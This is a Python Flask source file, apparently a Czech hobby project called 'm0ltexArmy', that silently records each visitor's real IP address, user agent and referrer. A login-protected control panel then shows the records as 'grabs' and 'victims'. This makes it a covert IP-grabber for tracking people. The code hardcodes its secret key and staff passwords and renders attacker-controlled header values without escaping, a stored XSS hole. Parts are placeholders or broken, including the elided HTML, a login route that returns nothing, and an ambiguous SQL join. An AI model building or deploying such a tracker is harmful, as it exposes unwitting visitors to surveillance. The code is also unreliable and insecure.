from flask import Flask, request, session, redirect
from flask_socketio import SocketIO, emit
import sqlite3
import os
import hashlib

app = Flask(__name__)
app.secret_key = "m0ltex_final_secret_2026"
socketio = SocketIO(app, cors_allowed_origins="*")

def init_db():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS visits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT, user_agent TEXT, referrer TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )""")
    c.execute("""CREATE TABLE IF NOT EXISTS unique_visits (
                    ip TEXT PRIMARY KEY, first_visit DATETIME,
                    last_visit DATETIME, visits INTEGER DEFAULT 1,
                    user_agent TEXT
                )""")
    conn.commit()
    conn.close()

init_db()

def get_real_ip():
    for h in ['CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP']:
        ip = request.headers.get(h)
        if ip: return ip.split(',')[0].strip()
    return request.remote_addr

# ====================== HOME ======================
@app.route("/")
def home():
    # ... (stejný home kód jako minule - nechám ti ho stejný)
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ref = request.headers.get('Referer', 'Direct')

    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("INSERT INTO visits (ip, user_agent, referrer) VALUES (?, ?, ?)", (ip, ua, ref))
    c.execute("""INSERT INTO unique_visits (ip, first_visit, last_visit, visits, user_agent)
                 VALUES (?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, ?) 
                 ON CONFLICT(ip) DO UPDATE SET last_visit=CURRENT_TIMESTAMP, visits=visits+1""", (ip, ua))
    conn.commit()
    conn.close()

    # Stejný HTML jako minule (matrix rain + sidebar)
    return """<html> ... (stejný home kód jako v předchozí zprávě) ... </html>"""

# ====================== LOGIN ======================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        key = request.form.get("key", "")
        if key == "FOUNDER123":
            session["role"] = "founder"
            return redirect("/dashboard")
        elif key == "STAFF123":
            session["role"] = "staff"
            return redirect("/dashboard")
        else:
            return "<h2 style='color:red;text-align:center;margin-top:100px;'>Špatné heslo!</h2><br><a href='/login'>← Zpět</a>"
    # ... login HTML stejný ...

# ====================== NOVÝ DASHBOARD ======================
@app.route("/dashboard")
def dashboard():
    if "role" not in session:
        return redirect("/login")

    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM visits"); total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM unique_visits"); unique = c.fetchone()[0]
    
    c.execute("""SELECT ip, timestamp, user_agent, referrer, visits 
                 FROM unique_visits 
                 LEFT JOIN visits ON unique_visits.ip = visits.ip 
                 GROUP BY unique_visits.ip 
                 ORDER BY unique_visits.last_visit DESC LIMIT 100""")
    logs = c.fetchall()
    conn.close()

    rows = ""
    for ip, time, ua, ref, visits in logs:
        ip_link = f"https://ipinfo.io/{ip}"   # kliknutelné
        rows += f"""
        <tr>
            <td><a href="{ip_link}" target="_blank" style="color:#00ffcc;">{ip}</a></td>
            <td>{time}</td>
            <td>{visits}</td>
            <td>{ua[:70]}...</td>
            <td>{ref if ref else 'Direct'}</td>
        </tr>"""

    return f"""
    <body style="background:#0a0a0a; color:#00ffcc; font-family:monospace; padding:30px; margin:0;">
    <h1 style="color:#ff0000; text-shadow:0 0 10px #ff0000;">CONTROL PANEL — {session['role'].upper()}</h1>
    <p>Total grabs: <b>{total}</b> | Unique victims: <b>{unique}</b></p>
    
    <table style="width:100%; border-collapse:collapse; background:#111; border:1px solid #ff0000;">
        <thead>
            <tr style="background:#1a0000;">
                <th style="padding:12px; text-align:left; border:1px solid #ff0000;">IP Address</th>
                <th style="padding:12px; text-align:left; border:1px solid #ff0000;">Last Visit</th>
                <th style="padding:12px; text-align:left; border:1px solid #ff0000;">Visits</th>
                <th style="padding:12px; text-align:left; border:1px solid #ff0000;">User-Agent</th>
                <th style="padding:12px; text-align:left; border:1px solid #ff0000;">Referrer</th>
            </tr>
        </thead>
        <tbody>
            {rows}
        </tbody>
    </table>
    
    <br>
    <a href="/logout" style="color:#ff6666;">Logout</a>
    </body>
    """

@app.route("/shop")
def shop():
    return "<h1 style='color:#ff0000;text-align:center;margin-top:100px;'>Shop se připravuje...</h1><a href='/'>← Home</a>"

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

# SocketIO zůstává stejný...
online_users = 0
@socketio.on("connect")
def connect(): 
    global online_users
    online_users += 1
    emit("online", online_users, broadcast=True)

@socketio.on("disconnect")
def disconnect():
    global online_users
    online_users = max(0, online_users - 1)
    emit("online", online_users, broadcast=True)

@socketio.on("command")
def command(cmd):
    emit("message", "Příkaz přijat: " + cmd)

if __name__ == "__main__":
    print("✅ m0ltexArmy v2.2 - Dashboard vylepšen")
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False)
